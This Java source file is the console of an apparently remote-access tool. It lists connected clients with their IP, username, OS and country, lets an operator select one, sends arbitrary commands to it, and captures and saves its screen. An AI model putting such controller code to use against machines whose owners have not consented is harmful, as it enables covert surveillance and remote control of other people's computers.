package electron.console;

import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.util.List;

import javax.imageio.ImageIO;

import electron.networking.NetData;
import electron.networking.SocketHandler;
import electron.networking.packets.OutputPacket;
import electron.networking.packets.ProcessPacket;
import electron.utils.Utils;
import electron.utils.logger;

public class Commands {
	private static SocketHandler client = null;

	public static boolean executeCommand(String command) {
		/*
		 * Server-side commands
		 */
		if (Utils.isMultiCommand("/client", command)) {
			String[] args = Utils.getCommandArgs(command);
			if (args[1].equalsIgnoreCase("list")) {
				drawActiveConnections();
				return true;
			}
			if (args[1].equalsIgnoreCase("select")) {
				try {
					String val = args[2];
					client = NetData.getClients().get(Integer.valueOf(val));
					logger.cmd(
							"Selected client: " + client.getInfo().getAddress() + " | " + client.getInfo().getUsername()
									+ " | " + client.getInfo().getOs() + " | " + client.getInfo().getCountry() + " | "
									+ client.getInfo().getNativeimage() + " | " + client.getInfo().getHeadless());
				} catch (Exception e) {
					logger.cmd("[ERR]: incorrect input or data. Message: " + e.getMessage());
				}
				return true;
			}
		}
		if (command.equalsIgnoreCase("/flush")) {
			System.out.flush();
			return true;
		}
		if (client == null) {
			logger.cmd("Select client firstly. Use /client select <id>");
			return true;
		}
		if (command.equalsIgnoreCase("/printscreen")) {
			drawImage();
			return true;
		}
		if (command.equalsIgnoreCase("/savescreen")) {
			saveImage();
			return true;
		}
		/*
		 * Client-side command
		 */
		if (!OutputPacket.sendOutPacket(command, client)) {
			logger.cmd("[ERR]: error sending command to remote client. :(");
		}
		return true;
	}

	/**
	 * Prints active connections
	 */
	private static void drawActiveConnections() {
		System.out.println();
		logger.cmd("ACTIVE CONNECTIONS:");
		int i = 0;
		for (SocketHandler client : NetData.getClients()) {
			// Printing data
			logger.cmd(i + " | " + client.getInfo().getAddress() + " | " + client.getInfo().getUsername() + " | "
					+ client.getInfo().getOs() + " | " + client.getInfo().getCountry() + " | "
					+ client.getInfo().getNativeimage() + " | " + client.getInfo().getHeadless());
			i++;
		}
		System.out.println();
		logger.cmd("Total clients connected: " + NetData.getClients().size());
	}

	private static boolean saveImage() {
		BufferedImage image = client.getScreen();
		if (image == null) {
			logger.cmd("[ERR]: image not found. Use /screen");
			return false;
		}
		File f = new File(logger.getTime().replaceAll(":", "-") + "_screen.jpg");
		try {
			ImageIO.write(image, "jpg", f);
			logger.cmd("Image saved successfully.");
			return true;
		} catch (IOException e) {
			e.printStackTrace();
			logger.cmd("Error saving image");
			return false;
		}
	}

	public static void drawImage() {
		BufferedImage image = client.getScreen();
		if (image == null) {
			logger.cmd("[ERR]: image not found. Use /screen");
			return;
		}
		int height = image.getHeight();
		int width = image.getWidth();

		for (int y = 0; y < height; y += 2) {
			for (int x = 0; x < width; x++) {
				int rgb = image.getRGB(x, y);
				int gray = (int) ((rgb & 0xFF) * 0.21 + ((rgb >> 8 & 0xFF) * 0.72) + ((rgb >> 16 & 0xFF) * 0.07));
				char c = getCharForGrayValue(gray);
				System.out.print(c);
			}
			System.out.println();
		}
	}

	private static char getCharForGrayValue(int grayValue) {
		char[] asciiChars = { '@', '#', '8', '&', 'o', ':', '*', '.', ' ' }; // используемые символы для оттенков серого
		int index = grayValue * (asciiChars.length - 1) / 255; // соответствие оттенка серого символу
		return asciiChars[index];
	}

}
